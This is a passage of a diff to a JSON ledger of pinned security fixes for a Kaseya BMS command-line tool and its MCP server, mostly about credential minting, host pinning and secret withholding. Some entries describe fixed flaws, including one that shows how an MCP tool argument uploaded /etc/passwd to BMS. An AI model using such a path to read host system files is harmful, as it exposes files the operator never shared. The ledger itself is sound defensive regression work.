+   "why": "Press-traps s6, measured on this tree: `auth set-token --dry-run` saved the token to credentials.toml, `auth logout --dry-run` cleared the stored credentials, and `export organizations --output f --dry-run` replaced f with the preview. The auth blocks are the fleet replay's auth-dry-run recipe text (this connector's ledger never carried that entry). TestDryRunChangesNoLocalFile seen failing (seen/dry-run-changes-nothing-seen-failing.log). Ported to kbms from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to kaseya-bms from the appdirect 4.34.2 reprint (one credential layer across the fleet). Ported to kaseya-bms from the datto-rmm 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/kbms_dryrun.go",
+     "contains": "would read a token from stdin and save it to the credential store",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kbms_dryrun.go",
+     "contains": "(dry run - nothing changed)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kbms_dryrun.go",
+     "contains": "if flags.dryRun {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kbms_dryrun_writes_test.go",
+     "contains": "func TestDryRunChangesNoLocalFile(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "envelope-unwrapped-for-sync",
+   "status": "active",
+   "spec_encoded": true,
+   "summary": "Every BMS list syncs: the Success, Error and TotalRecords siblings are removed from the 169 list response schemas in spec.json (the runtime body is unchanged), so 4.34.2 unwraps Result, types each list by its record (Id key) and keeps all 67 shipped partitions in the default sync",
+   "why": "Press 4.34.2 unwraps a single-array envelope only when every sibling is envelope metadata; Success, Error and TotalRecords are not in its list, so every BMS list's item type was the envelope (no id field), every resource was marked SkipDefaultSync, and defaultSyncResources() was EMPTY: `sync` stored nothing and all six novels (queue-health, stale-tickets, workload, contract-burn, unbilled, pipeline) read an empty store, with go build, go test, dogfood and shipcheck green. Spec-encoded (tools/spec_fix.py), so it survives every reprint by construction; the test pins the 67.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "return []string{\"Result\"}",
+     "code_only": true,
+     "min_count": 10
+    },
+    {
+     "file": "cli/internal/cli/kbms_sync_maps_test.go",
+     "contains": "func TestDefaultSyncKeepsTheShippedPartitions(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kbms_sync_maps_test.go",
+     "contains": "func TestTicketSyncPagesWithPageNumberAndUnwrapsResult(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "lookups-stay-in-default-sync",
+   "status": "active",
+   "spec_encoded": true,
+   "summary": "The 37 /lookup lists (priorities, queues, statuses, SLAs, work types, ...) carry x-pp-syncable: true in spec.json, so 4.34.2 keeps them in the default sync as 0.1.x did",
+   "why": "4.34.2 treats any `lookup` path segment as a live search index (liveSearchIndexExcludedFromSync) and dropped all 37 from sync; they are the small reference tables the local store and search answer from.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/kbms_sync_maps_test.go",
+     "contains": "\"system-priorities-lookup\", \"system-queues-lookup\", \"system-statuses-lookup\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kbms_sync_maps_test.go",
+     "contains": "func TestDefaultSyncKeepsTheShippedPartitions(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "sync-partition-names-pinned",
+   "status": "active",
+   "summary": "The 0.1.x sync partition names are pinned over the 4.34.2 render (16 renames in the name-keyed sync maps, tools/resource_names.py): tickets stay `servicedesk` (/v2/servicedesk/tickets), opportunities `crm`, views `system`, assignees `hr`, K1 modules `admin`, ...",
+   "why": "4.34.2 re-derived partition names and moved tickets to `servicedesk-tickets` while `servicedesk` became hardware assets (and `crm` the account lookup). Five novels read `servicedesk`/`crm`, and an upgraded store already holds tickets under `servicedesk`, so a silent re-point would join hardware assets as tickets in queue-health, stale-tickets, workload and contract-burn. Pure renames; every entry keeps its path, paging, ID key and response path.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"servicedesk-hardwareasset-searchselect\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"admin-finance-accountcodes-lookup\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "\"servicedesk-tickets\":"
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "\"crm-opportunities\":"
+    },
+    {
+     "file": "cli/internal/cli/kbms_sync_maps_test.go",
+     "contains": "func TestSyncPartitionNamesAreTheShippedOnes(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "token-minted-per-client",
+   "status": "active",
+   "summary": "Every API client the CLI, the novel commands and the MCP server build carries a live BMS token minted from KASEYA_BMS_USERNAME + KASEYA_BMS_PASSWORD + KASEYA_BMS_TENANT on first use and again when it expires (POST /v2/security/authenticate on the API host, through the client's own pinned transport); never under --dry-run, the verifier or an MCP preview; KASEYA_BMS_TOKEN / KASEYA_BMS_BEARER_AUTH win over minting",
+   "why": "0.1.x minted only in `auth login`, while its MCP manifest asks every install for the login: a Claude Desktop install answered 401 on every tool once the short-lived JWT expired (or immediately, with no prior `auth login`). A registerClientHook (internal/cli/kbms_guard.go mintForClient) reaches every client the generated CLI and MCP constructors build, so a regeneration cannot drop it.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/kbms_guard.go",
+     "contains": "return mintForClient(c)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kbms_guard.go",
+     "contains": "if c == nil || c.Config == nil || c.DryRun || cliutil.IsVerifyEnv() {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kbms_guard.go",
+     "contains": "config.EnsureKbmsTokenWith(context.Background(), c.HTTPClient, c.Config)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kbms_cred_rules_test.go",
+     "contains": "func TestMintedTokenIsHeldAndSent(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/kbmsblackbox/blackbox_test.go",
+     "contains": "func TestNoCredentialInAnyWrittenFile(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_auth_test.go",
+     "contains": "func TestEnsureMintsOncePerBindingAndReusesTheLiveToken(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "minted-token-bound-to-login-and-host",
+   "status": "active",
+   "summary": "A minted token is recorded with a binding (32 hex digits: a fingerprint of the API host and one of the tenant and username, saved as the credential store's client_id) and sent only for that binding: one mint per binding per process, a stored token reused only for the same login and host; with no login configured, a stored token bound to another host is dropped",
+   "why": "Work-order host pinning and the fleet class 'cached authentication ignores credential override': 0.1.x's `auth login` saved one token to config.toml with no record of the login or region it came from, so switching KASEYA_BMS_USERNAME/TENANT or KASEYA_BMS_BASE_URL sent the old token for the new login or to the new region.",
+   "asserts": [
+    {
+     "file": "cli/internal/config/kbms_auth.go",
+     "contains": "func KbmsTokenBinding(baseURL string, l KbmsLogin) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_auth.go",
+     "contains": "if cfg.AccessToken != \"\" && cfg.ClientID == binding && kbmsTokenLive(cfg.TokenExpiry) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_auth.go",
+     "contains": "o != kbmsOriginFingerprint(c.BaseURL)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_hold.go",
+     "contains": "dropKbmsTokenOutsideItsBinding(c)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_auth.go",
+     "contains": "_ = cfg.SaveTokens(binding, \"\", tok.Access, tok.Refresh, tok.Expiry)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kaseya_bms_auth.go",
+     "contains": "if err := cfg.SaveTokens(binding, \"\", tok.Access, tok.Refresh, tok.Expiry); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_auth_test.go",
+     "contains": "func TestBindingNamesTheHostAndTheLogin(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_auth_test.go",
+     "contains": "func TestStoredTokenNeverReachesAnotherHost(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mint-pinned-to-api-host",
+   "status": "active",
+   "summary": "The login request goes only to <API host>/v2/security/authenticate over a client that follows no redirect and refuses any other host (the mint hook uses the client's own pinned transport; `auth login` pins its client with guardTokenClient); never over plaintext http but to loopback; a base URL with userinfo, a non-http scheme or a non-ASCII host mints nothing; the error text shows the server's message only when it repeats no held value",
+   "why": "Work-order credential rule (host pinning). 0.1.x's `auth login` used a default http.Client, which re-sends a 307/308 POST body (the username, password and tenant) to whatever host the Location names.",
+   "asserts": [
+    {
+     "file": "cli/internal/config/kbms_auth.go",
+     "contains": "func newKbmsTokenHTTPClient() *http.Client {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_auth.go",
+     "contains": "return errors.New(\"refused: the Kaseya BMS token endpoint answered with a redirect\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_auth.go",
+     "contains": "if o := KbmsOrigin(req.URL.String()); o == \"\" || o != KbmsOrigin(baseURL) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_auth.go",
+     "contains": "func kbmsPlaintextRefused(endpoint string) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kaseya_bms_auth.go",
+     "contains": "guardTokenClient(hc, cfg, flags.dryRun)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kaseya_bms_auth.go",
+     "contains": "hc, err := client.NewPlainHTTPClient(30*time.Second, cfg)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kaseya_bms_auth.go",
+     "not_contains": "&http.Client{"
+    },
+    {
+     "file": "cli/internal/config/kbms_auth_test.go",
+     "contains": "func TestMintSendsTheBMSLoginForm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_auth_test.go",
+     "contains": "func TestMintNeverFollowsARedirectNorLeavesTheHost(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_auth_test.go",
+     "contains": "func TestMintRefusesPlaintextOffLoopback(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_auth_test.go",
+     "contains": "func TestFailedLoginRepeatsNoHeldValue(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kbms_cred_rules_test.go",
+     "contains": "func TestMintNeverLeavesTheAPIOrigin(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/kbmsblackbox/blackbox_test.go",
+     "contains": "func TestAuthLoginMintsOnlyAtItsHost(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "token-identity-follows-the-configured-credential",
+   "status": "active",
+   "summary": "The most explicit credential names the identity and nothing stored stands in for it: an environment KASEYA_BMS_TOKEN or KASEYA_BMS_BEARER_AUTH is the bearer (stored tokens, a stored auth_header and every auth-carrier [headers] entry are dropped from the loaded config); a configured login allows only a token minted for it on this host (other tokens, auth_header, a stored bms_token / bms_bearer_auth and auth-carrier headers are dropped)",
+   "why": "The datto-rmm 4.34.2 review's credential-identity class (round 1 fixed tokens, round 2 found a config [headers] Authorization still sent beside the configured credential). Built in from the start here, headers included.",
+   "asserts": [
+    {
+     "file": "cli/internal/config/kbms_auth.go",
+     "contains": "func dropKbmsTokenOutsideItsBinding(c *Config) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_auth.go",
+     "contains": "if kbmsAuthCarrierHeader(k) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_auth.go",
+     "contains": "if c.AccessToken != \"\" && c.ClientID != KbmsTokenBinding(c.BaseURL, l) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_auth_test.go",
+     "contains": "func TestEnvironmentTokenIsTheOnlyBearer(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_auth_test.go",
+     "contains": "func TestConfiguredLoginAllowsOnlyItsOwnToken(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kbms_rv1_identity_test.go",
+     "contains": "func TestStoredCredentialNeverStandsInForTheConfiguredOne(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "store-scope-stable-across-mints",
+   "status": "active",
+   "summary": "config.StoreScopeIdentity keeps one local store per host and login, so a re-minted token (hourly) keeps the same SQLite file; an environment token keeps the generated token-hash scope and never reuses a login's store",
+   "why": "4.34.2 names the SQLite file by a hash of the bearer token; a short-lived minted JWT would start an empty store every hour. The env-token exception closes the datto-rmm round-2 class 'tenant store identity mismatch' (an ambient login lending its store to another account's token).",
+   "asserts": [
+    {
+     "file": "cli/internal/config/kbms_auth.go",
+     "contains": "StoreScopeIdentity = kbmsStoreScope",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_auth.go",
+     "contains": "if c == nil || kbmsEnvTokenSet(c) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_auth_test.go",
+     "contains": "func TestConfiguredLoginAllowsOnlyItsOwnToken(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "api-origin-pinned",
+   "status": "active",
+   "summary": "A credential goes only to the scheme, host and port configured for it: every API request, the login POST and the bearer token to the API base URL's origin; every redirect hop stays on the origin of the request it follows; a non-ASCII or unparseable host never matches; a base URL with userinfo pins nothing",
+   "why": "Work-order credential rule (host pinning). BMS serves the login on the API host, so the guard has one pin. Applied through registerClientHook (every CLI, novel and MCP client).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/kbms_guard.go",
+     "contains": "func (p kbmsPins) check(req *http.Request) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kbms_guard.go",
+     "contains": "installPins(c.HTTPClient, newKbmsPins(c.BaseURL), c.DryRun)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kbms_cred_rules_test.go",
+     "contains": "func TestPinAllowsOnlyTheAPIOrigin(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kbms_cred_rules_test.go",
+     "contains": "func TestOriginPinKeepsTheTokenOnTheAPIHost(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/kbmsblackbox/blackbox_test.go",
+     "contains": "func TestRedirectNeverReachesAnotherHost(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "auth-login-registered",
+   "status": "active",
+   "summary": "`auth login` (internal/cli/kaseya_bms_auth.go) is registered under `auth`",
+   "why": "0.1.x registered it with an edit in root.go; the 4.34.2 render has no line for it, so a reprint without this edit drops the documented primary auth command while every gate stays green.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "cmd.AddCommand(newAuthLoginCmd(flags))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kaseya_bms_auth.go",
+     "contains": "func newAuthLoginCmd(flags *rootFlags) *cobra.Command {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "auth-login-dry-run-sends-nothing",
+   "status": "active",
+   "summary": "`auth login --dry-run` names the request and saves nothing; the minted token is never printed (text or --json); the token goes to the 0600 credential store, never config.toml",
+   "why": "0.1.x's dry run was honoured, but the token was saved to config.toml and its JSON named config_path; the work order's credential rules require the credential store only.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/kaseya_bms_auth.go",
+     "contains": "if dryRunOK(flags) || cliutil.IsVerifyEnv() {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kaseya_bms_auth.go",
+     "contains": "savePath := credentialSavePath(cfg)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/kbmsblackbox/blackbox_test.go",
+     "contains": "func TestDryRunSendsNothing(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "auth-setup-names-the-login",
+   "status": "active",
+   "summary": "`auth setup` and `auth status` name the BMS login (username, password, tenant) and the region variable before the generated set-token step",
+   "why": "The generated steps knew only a pasted bearer token; the documented path is the login, which mints on first use.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "cliutil.EnvAssignHint(true, \"KASEYA_BMS_USERNAME\", \"api-user@yourmsp.com\", \"KASEYA_BMS_PASSWORD\"",
+     "code_only": true,
+     "min_count": 2
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "auth login   # checks the login; pass --mfa-code for an MFA user",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "login-reads-as-configured",
+   "status": "active",
+   "summary": "config.CredentialConfigured counts a complete login (it mints on first use), so `auth status` reports authenticated and doctor probes the credential (its probe client mints) instead of 'no credential is configured'",
+   "why": "The generated auth status and doctor read only the Authorization header, so a correctly configured login read as unconfigured and doctor never probed it.",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "return c.AuthHeader() != \"\" || (l.Username != \"\" && l.Password != \"\" && l.Tenant != \"\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "authed := header != \"\" || cfg.CredentialConfigured()",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "if authHeader == \"\" && !cfg.CredentialConfigured() {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "if KbmsEnvLogin().Password != \"\" {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-preview-never-mints",
+   "status": "active",
+   "summary": "The MCP execute tool builds its client before its confirm check; a call that only previews (a write without confirm: true) builds one that does not mint",
+   "why": "A preview must send nothing, the login request included (the login carries the password).",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "contains": "newMCPClientForCall(ctx, method == \"GET\" || !executeTool || codeOrchConfirmAccepted(args[\"confirm\"]))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/kbmsblackbox/kbms_r1_authcode_test.go",
+     "contains": "func TestMCPReadOnlyPostMints(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/kbms_preview_client.go",
+     "contains": "defer cli.WithoutMintFor(cfg)()",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/kbmsblackbox/blackbox_test.go",
+     "contains": "func TestMCPWriteSendsOnlyWithConfirmTrue(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "local-partition-follows-the-path",
+   "status": "active",
+   "summary": "A sync partition serves and receives only the records of its own sync path: a generated read whose path is a sync path uses that partition, a read naming a sync partition of another path has no local read and no write-through cache, and a mutation response never enters a sync partition",
+   "why": "The generator passes the command GROUP label as every command's data-source key, so every servicedesk command (hardware assets, notes, charges, ...) read from and cached into `servicedesk`, the synced tickets partition the novels read: a default (auto) live read of hardware assets would be counted as tickets by queue-health. The datto-rmm review's wrong-local-partition class, built in from the start.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/kbms_partitions.go",
+     "contains": "func kbmsLocalPartition(resourceType, path string) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "if resourceType = kbmsLocalPartition(resourceType, path); resourceType == \"\" {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "writeThroughCache(ctx, kbmsLocalPartition(resourceType, path), data)",
+     "code_only": true,
+     "min_count": 2
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "if resourceType == \"\" || syncOwnsPartition(resourceType) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kbms_rv1_partition_test.go",
+     "contains": "func TestSyncPartitionHoldsOnlyItsOwnPath(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "doctor-bms-root-not-placeholder",
+   "status": "active",
+   "summary": "doctor_verdict.go doctorShippedBaseURL is \"\": the shipped default https://api.bms.kaseya.com is Kaseya's real US API host, not a placeholder",
+   "why": "press-traps s5: with the real host as the 'shipped placeholder', doctor printed 'base_url is still the shipped placeholder' on every healthy default install and skipped the credential probe.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "const doctorShippedBaseURL = \"\"",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credential-names-match-bms-data",
+   "status": "active",
+   "summary": "publicSecretLikeFields is derived from the BMS spec: every credential-shaped name the vendor uses is either held (Password, MFACode, ClientSecret, SamlKey, SamlResponse, ItcToken, AccessToken, RefreshToken, PasswordOrToken, Secret, RemoteControl ClientId, Pulseway Token, AuthorizationLink, FullCalendarLicenseKey) or exempt as data (expiry timestamps, booleans, a count, a record id, the session list, two record identifiers, a paging cursor)",
+   "why": "press-traps (salesbuildr -> backup-radar): a ported credential layer's names are the donor's. Every held value is matched anywhere at any length, so a held count or record id blanks whole lists, and a missed credential name prints a secret; the test reads the spec the connector ships.",
+   "asserts": [
+    {
+     "file": "cli/internal/cliutil/kbms_secrets.go",
+     "contains": "\"accesstokenexpireon\":  true,",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/kbms_secrets.go",
+     "contains": "\"skiptoken\":            true,",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/kbms_names_test.go",
+     "contains": "func TestBMSCredentialNamesAreClassified(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/kbms_names_test.go",
+     "contains": "func TestNoBMSSpecNameReadsAsACredential(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credential-endpoint-result-held",
+   "status": "active",
+   "summary": "The answer of an endpoint whose path names a credential (itglue/passwords/{id}, remotesessions, security/authenticate, security/refreshtoken) is held when its Result is a bare scalar: the IT Glue password GET /v2/integrations/itglue/passwords/{passwordId} returns as {\"Result\":\"<password>\"} prints withheld on the CLI and over MCP",
+   "why": "The name-based holder reads a credential only under a credential-named key; StringResponse puts the IT Glue password under Result, so `integrations get-itgpassword-value` printed a tenant password and the MCP read returned it to any agent. Object answers keep the name-based holding (their expiry timestamps are data). Read IT Glue passwords in IT Glue.",
+   "asserts": [
+    {
+     "file": "cli/internal/cliutil/kbms_secrets.go",
+     "contains": "func CredentialPath(p string) bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kbms_guard.go",
+     "contains": "func holdCredentialResult(plain []byte) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kbms_guard.go",
+     "contains": "func (t credentialResultTripper) RoundTrip(req *http.Request) (*http.Response, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kbms_guard.go",
+     "contains": "!cliutil.CredentialPath(req.URL.Path) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kbms_credential_result_test.go",
+     "contains": "func TestCredentialEndpointResultIsHeldUnderAnyName(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kbms_credential_result_test.go",
+     "contains": "func TestOrdinaryResultIsNotHeld(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "token-request-follows-no-redirect",
+   "status": "active",
+   "summary": "MintKbmsToken refuses every redirect, whatever client carries it (the client hook passes the API client's guarded transport, which allows a same-origin hop)",
+   "why": "tests-helper finding TestMintNeverLeavesTheAPIOrigin (seen failing): a 307 from the login re-posted the form, the password included, to a path nobody configured on the same host, and its answer was taken as the token.",
+   "asserts": [
+    {
+     "file": "cli/internal/config/kbms_auth.go",
+     "contains": "noRedirect := *hc",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/kbms_auth.go",
+     "contains": "noRedirect.CheckRedirect = func(*http.Request, []*http.Request) error {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "output-files-untouched-under-dry-run",
+   "status": "active",
+   "summary": "Under --dry-run every command that takes an --output file path (export today, any a later print adds) previews to stdout and leaves the file alone",
+   "why": "tests-helper finding TestDryRunChangesNoLocalFile (seen failing): `export timelogs --output f --dry-run` replaced f with the preview (the datto export guard this layer was ported from was not carried, so the class is fixed for every --output command).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/kbms_dryrun.go",
+     "contains": "func previewOutputUnderDryRun(cmd *cobra.Command, flags *rootFlags) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/kbms_dryrun_writes_test.go",
+     "contains": "func TestDryRunChangesNoLocalFile(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credential-endpoint-request-held",
+   "status": "active",
+   "summary": "A request to an endpoint whose path names a credential (security/authenticate, security/refreshtoken, itglue/passwords, remotesessions) has every query and body value held before a --dry-run preview or a send, but an allowlist of identifiers (user name, tenant, grant type, redirect URI)",
+   "why": "Codex r1 class holder incomplete: the BMS login form's OAuth authorization code is named `Code`, which is an account or error code in eight other schemas, so `security authenticate --grant-type authorization_code --code X --dry-run` printed the code. Allowlisting what may be shown fails closed for every other login field.",
+   "asserts": [
+    {
+     "file": "cli/internal/client/kbms_request_hold.go",
+     "contains": "func holdCredentialEndpointRequest(path string, params map[string]string, body any) {",
      "code_only": true
     },
     {
      "file": "cli/internal/client/client.go",
-     "contains": "held = append(held, value)",
-     "min_count": 1,
+     "contains": "holdCredentialEndpointRequest(path, params, body)",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "return cliutil.FunnelWithhold(masked, held)",
-     "min_count": 1,
+     "file": "cli/internal/cliutil/kbms_secrets.go",
+     "contains": "var credentialEndpointIdentifiers = map[string]bool{\"username\": true, \"tenant\": true, \"granttype\": true, \"redirecturi\": true}",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "func (c *Client) shownErrorBody(body []byte, extraCredentials ...string) string {",
-     "min_count": 1,
+     "file": "cli/internal/cliutil/kbms_secrets.go",
+     "contains": "func HoldCredentialEndpointValues(fields map[string]any) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "Body:       c.shownErrorBody(respBody, authHeader),",
-     "min_count": 1,
+     "file": "cli/internal/client/kbms_request_hold_test.go",
+     "contains": "func TestCredentialEndpointRequestHoldsEveryValueButTheIdentifiers(t *testing.T) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "c.maskCredentialText(truncateBody(respBody), authHeader)"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(string(body))"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(truncateBody(body))"
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "var funnelSteps = []func(string) []string{",
-     "min_count": 1,
+     "file": "cli/internal/kbmsblackbox/kbms_r1_authcode_test.go",
+     "contains": "func TestAuthorizationCodeNeverPrints(t *testing.T) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "funnelTextStep(funnelIdentityUnescape),",
-     "min_count": 1,
+     "file": "cli/internal/kbmsblackbox/kbms_r1_authcode_test.go",
+     "contains": "func TestMCPLoginPreviewNeverReturnsTheAuthorizationCode(t *testing.T) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelHeld(text string) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelCodexRound2(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/secret_funnel_cli.go",
-     "contains": "func funnelCommandErrors(root *cobra.Command) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/secret_funnel_cli_test.go",
-     "contains": "func TestFunnelCommandErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/root.go",
-     "contains": "funnelCommandErrors(rootCmd)",
-     "min_count": 1,
+     "file": "cli/internal/mcp/kbms_credential_args.go",
+     "contains": "func HoldCredentialEndpointArguments(args map[string]any) {",
      "code_only": true
     },
     {
      "file": "cli/cmd/kaseya-bms-mcp/main.go",
-     "contains": "server.WithToolHandlerMiddleware(funnelToolErrors),",
-     "min_count": 1,
+     "contains": "server.WithToolHandlerMiddleware(holdCredentialEndpointArguments),",
      "code_only": true
     },
     {
-     "file": "cli/cmd/kaseya-bms-mcp/secret_funnel_mcp.go",
-     "contains": "func funnelToolErrors(next server.ToolHandlerFunc) server.ToolHandlerFunc {",
-     "min_count": 1,
+     "file": "cli/cmd/kaseya-bms-mcp/main.go",
+     "contains": "mcptools.HoldCredentialEndpointArguments(req.GetArguments())",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-arguments-never-name-a-host-file",
+   "status": "active",
+   "summary": "An MCP multipart file argument is base64 file content, never a host path: KASEYA_BMS_MCP_UPLOAD_ROOT is ignored",
+   "why": "Codex r1 class host file read (P1 by the threat model): the generated opt-in path mode read any file under the root an operator named, so with KASEYA_BMS_MCP_UPLOAD_ROOT=/etc a `kaseya-bms_execute` of system.post-temp-attachment with File=passwd uploaded /etc/passwd to BMS. The README promises a tool argument never names a file.",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "root := \"\"",
      "code_only": true
     },
     {
-     "file": "cli/cmd/kaseya-bms-mcp/secret_funnel_mcp_test.go",
